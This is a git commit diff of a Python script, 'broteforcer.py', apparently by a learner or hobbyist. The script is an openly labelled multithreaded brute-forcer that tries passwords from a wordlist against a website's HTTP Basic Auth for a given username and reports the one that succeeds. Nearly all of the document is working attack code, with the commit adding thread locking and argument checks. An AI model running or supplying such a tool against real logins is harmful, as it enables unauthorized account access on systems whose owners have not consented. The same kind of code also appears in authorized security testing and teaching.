05131c14d397784976645004adf62330eecd0444
cy6erlem0n <dmytriy.drozd.2014@gmail.com>
2024-12-31 15:10:40 +0100

    version 1

--- broteforcer.py
+++ broteforcer.py
@@ -1,41 +1,38 @@
 #!/usr/bin/python
 
 import requests
-from threading import Thread
+from threading import Thread, Lock
 import sys
 import getopt
 
-global hit
-hit = "1" 
 
-class request_performer(Thread):
-    def __init__(self, name, user, url):
+class RequestPerformer(Thread):
+    def __init__(self, password, user, url, hit_lock):
         Thread.__init__(self)
-        self.password = name.split("\n")[0]
+        self.password = password.strip()
         self.user = user
         self.url = url
-        print(f"- {self.password} -")
+        self.hit_lock = hit_lock
+        print(f"- Trying: {self.password} -")
+
     def run(self):
-        global hit 
-        if hit == "1":
-            try:
-                r = requests.get(self.url, auth=(self.user, self.password))
-                if r.status_code == 200:
-                    hit = "0"
+        try:
+            response = requests.get(self.url, auth=(self.user, self.password))
+            if response.status_code == 200:
+                with self.hit_lock:
                     print(f"[+] Password Found - {self.password}")
-                    sys.exit()
-                else:
-                    print(f"[!!] - {self.password} Is not Valid")
-                    i[0] = i[0] - 1
-            except Exception as e:
-                print(e)
+                sys.exit(0)
+            else:
+                print(f"[!!] Invalid password: {self.password}")
+        except requests.RequestException as e:
+            print(f"Error: {e}")
 
 
+def banner():
+    print("#########################")
+    print("* Our Basic Bruteforcer *")
+    print("#########################")
 
-def banner ():
-    print(f"#########################")
-    print(f"* Our Basic Bruteforcer *")
-    print(f"#########################")
 
 def usage():
     print("Usage:")
@@ -43,60 +40,75 @@ def usage():
     print("     -u: username")
     print("     -t: threads")
     print("     -f: password list")
-    print("Example: ./broteforcer.py -w http://somesite.com -u admin -t 5 -f passwd.txt")
+    print(
+        "Example: ./broteforcer.py -w http://somesite.com -u admin -t 5 -f passwd.txt"
+    )
 
 
 def start(argv):
+
     banner()
-    if len(sys.argv) < 5:
-        usage()
-        sys.exit()
+
     try:
         opts, args = getopt.getopt(argv, "u:w:f:t:")
-    except getopt.GetoptError:
-        print(f"Error on arguements")
-        sys.exit()
-    for opt,arg in opts:
-        if opt == '-u':
+    except getopt.GetoptError as e:
+        print(f"Error in arguements: {e}")
+        usage()
+        sys.exit(2)
+
+    user, url, passlist, threads = None, None, None, None
+
+    for opt, arg in opts:
+        if opt == "-u":
             user = arg
-        elif opt == '-w':
+        elif opt == "-w":
             url = arg
-        elif opt == '-f':
+        elif opt == "-f":
             passlist = arg
-        elif opt == '-t':
-            threads = arg
+        elif opt == "-t":
+            threads = int(arg)
+
+    if not user or not url or not passlist or not threads:
+        print("[!!] Missing required arguments")
+        usage()
+        sys.exit(2)
+
     try:
-        f = open(passlist, "r")
-        passwords = f.readlines()
-    except:
-        print(f"[!!]Cant open that file")
-        sys.exit()
-    launcher_thread(passwords, threads, user, url)
+        with open(passlist, "r") as f:
+            passwords = f.readlines()
+    except FileNotFoundError:
+        print("[!!] Cannot open the specified password file")
+        sys.exit(2)
 
-def launcher_thread(passwords, threads, user, url):
-    global i 
-    i = []
-    i.append(0)
-    while len(passwords):
-        if hit == "1":
-            try:
-                if i[0] < threads:
-                    passwd = passwords.pop(0)
-                    i[0] = i[0] + 1
-                    thread = request_performer(passwd, user, url)
-                    thread.start()
-            except KeyboardInterrupt:
-                print(f"[!!]Interrupted")
-                sys.exit()
-            threads.join()
-            
+    if not passwords:
+        print("[!!] Password list is empty")
+        sys.exit(2)
 
-    
+    hit_lock = Lock()
 
+    launcher_thread(passwords, threads, user, url, hit_lock)
+
+
+def launcher_thread(passwords, max_threads, user, url, hit_lock):
+    threads = []
+    while passwords:
+        if len(threads) < max_threads:
+            password = passwords.pop(0)
+            thread = RequestPerformer(password, user, url, hit_lock)
+            thread.start()
+            threads.append(thread)
+
+        for thread in threads[:]:
+            if not thread.is_alive():
+                threads.remove(thread)
+
+    for thread in threads:
+        thread.join()
 
 
 if __name__ == "__main__":
     try:
         start(sys.argv[1:])
     except KeyboardInterrupt:
-        print(f"[!!]Interrupted")
+        print("[!!] Interrupted by user")
+        sys.exit(1)
